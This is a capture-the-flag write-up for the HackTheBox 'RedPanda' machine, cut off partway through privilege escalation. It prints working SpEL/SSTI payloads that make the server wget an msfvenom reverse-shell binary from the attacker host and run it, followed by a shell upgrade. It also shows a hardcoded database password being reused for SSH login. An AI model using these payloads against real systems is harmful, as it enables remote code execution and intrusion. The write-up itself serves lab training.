# RedPanda

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```
$ export IP=10.10.11.170
$ echo $IP
10.10.11.170
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```
$ ping $IP
PING 10.10.11.170 (10.10.11.170) 56(84) bytes of data.
64 bytes from 10.10.11.170: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.11.170: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.11.170: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.11.170: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Scan

First step after spawning in the target machine and connected to the VPN, I start an [`nmap`](https://nmap.org) scan to determine open ports and running services and may be vulnerable using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

After the scan is complete, here's the result:

```
Nmap scan report for 10.10.11.170
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
```

---

## RedPanda Search - Web Scan

So after the scan is done, I check out the web app running IP address on port 8080, and I try manually some paths like `/admin`, `/index.php` but I immediately got an error: 

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
There was an unexpected error (type=Not Found, status=404).
```

After some googling, I found out that this app is running [Spring](https://spring.io) which works with Java.

![RedPanda Search Page](https://i.imgur.com/UrdVfGT.png)

I started typing in the text box some SQL Injection attempts such as `" or 1=1--` ..etc, but all went through with no success, So I tried pressing the search button with no input, and I got a result of a panda called "Greg" whose description was:

> Greg is a hacker. Watch out for his injection attacks!

![Greg Search Result](https://imgur.com/BHh12Az.png)

This shows that I'm on the right path, which is Injection, but maybe not SQL Injection. So I googled about some other types of injections and I read about "Server Side Template Injection" (SSTI), and found this amazing [article on Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

---

## Detecting SSTI

In an attempt to try SSTI on the target machine, I tried the following:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

Most of them gave an error `Banned characters` which might be `%`, `$`. But at last, `*{7*7}` seemed to work perfectly:

![SSTI Injection Success](https://imgur.com/hhEM4zQ.png)

---

## SSTI Exploitation

The next step I will be trying to get a reverse shell to the target machine, so at first i tried to play a little bit with this vulnerability to see how can I get to upload a malware file and executed it on the target machine.

After some reading, I found that `*{T(java.lang.Runtime).getRuntime().exec('')}` can run shell commands through the search field. So I started a Python http server to see if I can get the target machine to connect to my server. At first I entered in the search field `${T(java.lang.Runtime).getRuntime().exec('curl 10.10.16.2:80')}`:

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [16/Sep/2022 01:25:32] "GET / HTTP/1.1" 200 -
```

Perfect, now I can upload a file on the target machine and run it, and get a reverse shell. I prepared a non-meterpreter stageless payload using `msfvenom`:

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f elf > payload.elf
```

Before uploading the payload to the target machine, I started listening on port 1337 using netcat:

```
$ nc -lvnp 1337                        
listening on [any] 1337 ...

```

And now time to upload the payload. first I uploaded the payload, then I had to change the permissions to execute the payload file, then run it, using the following queries in the search field:

```
*{T(java.lang.Runtime).getRuntime().exec("wget http://10.10.16.2/payload.elf")}
*{T(java.lang.Runtime).getRuntime().exec("chmod 777 payload.elf")}
*{T(java.lang.Runtime).getRuntime().exec("./payload.elf")}
```

And we finally got a reverse shell! to make the shell more interactive I executed the following commands:

```
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.170] 51030
whoami
woodenk
python3 -c "import pty; pty.spawn('/bin/bash')"
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
zsh: suspended  sudo nc -lvnp 1337
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo                                 
                                                                                                                                                             
┌──(kali㉿kali)-[~]
                                                 └─$ fg              
[1]  + continued  sudo nc -lvnp 1337
                                    export TERM=xterm
export TERM=xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ls   
ls
887  linpeas  linpeas.sh  notevil1.elf  payload.elf
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

```

### Getting the user flag:

The user flag can be found in /home/woodenk/user.txt

```
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /home
cd /home
woodenk@redpanda:/home$ ls
ls
woodenk
woodenk@redpanda:/home$ cd woodenk
cd woodenk
woodenk@redpanda:/home/woodenk$ ls
ls
user.txt
woodenk@redpanda:/home/woodenk$ cat user.txt
cat user.txt
******************************
```

---

## Privilege Escalation

Inside the reverse shell where I spawned at `/tmp/hsperfdata_woodenk` I found [linpeas.sh](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh) which is a tool that enumerates and search possible misconfigurations or any vulnerability to escalate privs on linux machines, so I just run it `/linpeas.sh`.

after linpeas did its magic, I went through and read its output, first thing that got my attention is that there's a service running locally on port 3306 and after I googled it, turns out to be the default port for the classic MySQL protocol, so I tried to connect to it using the user name `woodenk` but It required a password that I didn't have... yet.

After some more digging, I found a path that might be in my interest: `/opt/panda_search/src/main/resources/static/css/panda.css`.

This means that the source files of that web application are located there, which potentially contains some mysql information. I navigated to this location and started digging into these directories at `/opt/panda_search/src`.

I started looking at the directories/files in this location by using `ls -R`, I'm gonna show what caught my attention:

```
woodenk@redpanda:/opt/panda_search/src$ ls -R
ls -R

...

./main/java/com/panda_search/htb/panda_search:
MainController.java  PandaSearchApplication.java  RequestInterceptor.java

...


```

I started with `MainController.java` and read through the code trying to roughly understand what's happening, and the following block of code might be useful:

```
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java
cat MainController.java


...

	 public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

In this section we can see that the password of the user `woodenk` on the sql server is `RedPandazRule`, and since port 22 is open and running `OpenSSH` according to the scan at the beginning, I tried to connect through SSH with the username koodenk and this passphrase.

```
$ ssh woodenk@10.10.11.170
woodenk@10.10.11.170's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

...

woodenk@redpanda:~$ 
```

I connected to the mysql server to see if there's anything that might be interesting:

```
woodenk@redpanda:-$ mysql -u woodenk -p -D red_panda
Enter password: 

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| red_panda          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use red_panda
Database changed
mysql> show tables;
+---------------------+
| Tables_in_red_panda |
+---------------------+
| pandas              |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from pandas;
 
...

mysql> 
```

Nothing interesting in these tables, but at least I got the passphrase.

### Pspy64

After hours of googling, I found a tool that can be useful, [pspy](https://github.com/DominicBreuker/pspy) which is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. And I found that a jar file is being executed every once in a while, so I went to take a look at it

```
...
CMD: UID=0    PID=92567  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
...
```

<----- TO BE CONTINUED ----->

---